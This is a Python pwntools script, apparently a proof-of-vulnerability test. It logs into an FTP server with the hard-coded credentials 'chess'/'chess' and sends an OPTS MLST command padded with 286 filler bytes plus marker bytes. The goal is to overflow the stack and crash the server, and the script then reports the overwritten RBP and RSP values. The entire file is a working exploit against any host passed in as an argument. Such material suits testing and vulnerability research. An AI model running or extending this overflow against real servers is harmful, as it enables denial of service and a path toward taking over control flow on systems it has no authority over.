import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal
import netifaces
import binascii

from threading import Thread

from pwn import *

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[SUCCESS] sigalrm fired so the POV was likely successful')
    print('[RSP] 0x6464646464646464')
    print('RBP 0x6363636363636363')

    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(3)

    p = remote(HOST, 21)

    print(p.readline())
    p.send(b'USER chess\r\n')
    print(p.readline())
    p.send(b'PASS chess\r\n')
    print(p.readline())
    p.send(b'SYST\r\n')
    print(p.readline())
    p.send(b'TYPE I\r\n')
    print(p.readline())

    req = 'OPTS MLST modify;type'

    req += 'a'*286
    req += 'b'*8
    req += 'c'*8
    req += 'd'*8
    req += 'e'*8

    req += ';\r\n'

    p.send(req)

    try:
        print(p.readline())
    except:
        print('[SUCCESS] POV likely successful')
        print('[RSP] 0x6464646464646464')
        print('RBP 0x6363636363636363')

        exit(0)
        

    p.send('QUIT\r\n')
    p.close()

    print('[FAIL] POV unsuccessful')
    exit(1)

if __name__ == '__main__':
    main()
